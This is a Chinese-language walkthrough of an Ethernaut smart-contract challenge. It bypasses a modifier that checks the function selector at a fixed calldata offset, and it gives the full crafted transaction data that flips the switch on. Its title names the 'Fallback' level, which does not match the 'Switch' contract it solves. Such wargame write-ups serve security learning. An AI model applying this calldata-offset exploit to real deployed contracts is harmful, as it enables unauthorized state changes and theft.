# Ethernaut 01-Fallback

## 本关目标

- switchOn=true

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()")); // trunSwitchOff的函数选择器

    // 只有当前合约才可以
     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    // 调用的方法必须是turnSwitchOff()
    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    // 翻转switch, 使用data去调用其他方法，但是会检查调用的是不是turnSwitchOff
    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    // 以下两个函数表明，它们只能被这个合约调用
    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```

## 解决方案

1. 在这个合约中我们唯一可以用的方法就是 flipSwitch(bytes memory \_data)，但是这个方法被限制理论上只能调用 turnSwitchOff()
2. 获取一下 turnSwitchOff 的函数选择器是多少：web3.eth.encodeFunctionSignature("turnSwitchOff()")--》'0x20606e15'
3. 获取一下我们要实际调用的 trunSwitchOn 的函数选择器是多少：web3.eth.abi.encodeFunctionSignature("turnSwitchOn()")--》'0x76227e12'
4. 正常调用 flipSwitch(offSelector)对应的 data 是：

```solidity
web3.eth.abi.encodeFunctionCall({
  name: 'flipSwitch',
  type: 'function',
  inputs: [{ type: 'bytes', name: '_data' }]
}, ['0x20606e15']);
```

- 0x
  30c13ade --> flipSwitch 函数选择器 4bytes  
  0000000000000000000000000000000000000000000000000000000000000020 --> 偏移量 32bytes  
  0000000000000000000000000000000000000000000000000000000000000004 --> 数据长度 4bytes
  20606e1500000000000000000000000000000000000000000000000000000000 --> Data turnSwitchOff 的函数选择器
- 因此在 onlyOff()中提取 turnSwitchOff 的函数选择器设置 offset 为 68（4+32+32）

5. 可以通过修改偏移量来保证通过 68bytes 取到 turnSwitchOff 的函数选择器，但是真实 Data 为 turnSwitchOn 函数选择器

- 0x
  30c13ade --> flipSwitch 函数选择器 4bytes  
  0000000000000000000000000000000000000000000000000000000000000060 --> 偏移量 96bytes（turnSwitchOn 在 96bytes 后)  
  0000000000000000000000000000000000000000000000000000000000000000 --> 凑数
  20606e1500000000000000000000000000000000000000000000000000000000 --> Data turnSwitchOff 的函数选择器(68 偏移量规避检查)  
  0000000000000000000000000000000000000000000000000000000000000004 --> 数据长度 4bytes  
  76227e1200000000000000000000000000000000000000000000000000000000 --> 真实数据为 turnSwitchOn 选择器被执行

6. await sendTransaction({from: player, to: contract.address, data: '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000'})
7. await contract.switchOn()--> true
